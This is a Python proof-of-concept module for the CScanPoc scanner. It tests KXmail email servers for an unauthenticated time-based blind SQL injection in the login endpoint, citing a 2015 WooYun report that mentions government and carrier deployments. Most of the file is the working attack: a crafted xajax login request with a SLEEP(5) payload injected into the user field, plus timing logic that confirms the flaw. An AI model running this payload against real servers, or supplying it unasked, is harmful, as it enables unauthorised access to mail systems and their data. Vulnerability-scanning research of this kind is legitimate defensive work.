# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '976c88bf-7d3b-4e69-9384-182e7c207920'
    name = '科信邮件系统漏洞另一处SQL盲注' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-22'  # 漏洞公布时间
    desc = '''
        科信邮件系统漏洞另一处SQL盲注(无需登录23案例涉及政府部门运营商) 
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=122071' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'KXmail'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1fa850b5-7221-4337-b332-643867609a23'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            path='/prog/login.server.php'
            payload="xjxfun=Function_PostLogin&xjxr=1434907361662&xjxargs[]=<xjxobj><e><k>lo_os</k><v>SWindows_NT</v></e><e><k>lo_processor</k><v>S<![CDATA[EM64T Family 15 Model 6 Stepping 8, GenuineIntel]]></v></e><e><k>lo_computername</k><v>SRD-HL-EMAIL</v></e><e><k>lo_user_agent</k><v>S<![CDATA[Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14]]></v></e><e><k>lo_ip</k><v>S...</v></e><e><k>lo_language</k><v>S<![CDATA[zh-CN,zh;q=0.8]]></v></e><e><k>user</k><v>Sadmin139</v></e><e><k>domain</k><v>S...</v></e><e><k>passwd</k><v>Sadmin</v></e><e><k>co_language_select</k><v>S<![CDATA[../language/chinese_gb.php]]></v></e><e><k>co_sy_id</k><v>S10</v></e><e><k>random_pic</k><v>S5139</v></e><e><k>random_num</k><v>S240955</v></e></xjxobj>"
            target=arg+path
            fst_s=time.time()
            code1, head, res, errcode, _ = hh.http(target,payload)
            fst_e=time.time()

            
            payload="xjxfun=Function_PostLogin&xjxr=1434907361662&xjxargs[]=<xjxobj><e><k>lo_os</k><v>SWindows_NT</v></e><e><k>lo_processor</k><v>S<![CDATA[EM64T Family 15 Model 6 Stepping 8, GenuineIntel]]></v></e><e><k>lo_computername</k><v>SRD-HL-EMAIL</v></e><e><k>lo_user_agent</k><v>S<![CDATA[Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14]]></v></e><e><k>lo_ip</k><v>S...</v></e><e><k>lo_language</k><v>S<![CDATA[zh-CN,zh;q=0.8]]></v></e><e><k>user</k><v>Sadmin139' AND(SELECT * FROM (SELECT(SLEEP(5)))taSu) AND 'dwkL'='dwkL</v></e><e><k>domain</k><v>S...</v></e><e><k>passwd</k><v>Sadmin</v></e><e><k>co_language_select</k><v>S<![CDATA[../language/chinese_gb.php]]></v></e><e><k>co_sy_id</k><v>S10</v></e><e><k>random_pic</k><v>S5139</v></e><e><k>random_num</k><v>S240955</v></e></xjxobj>"
            sec_s=time.time()
            code2, head, res, errcode, _ = hh.http(target,payload)
            sec_e=time.time()

            fst=fst_e-fst_s
            sec=sec_e-sec_s
            
            if code1==code2!=0 and fst<2 and sec>5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()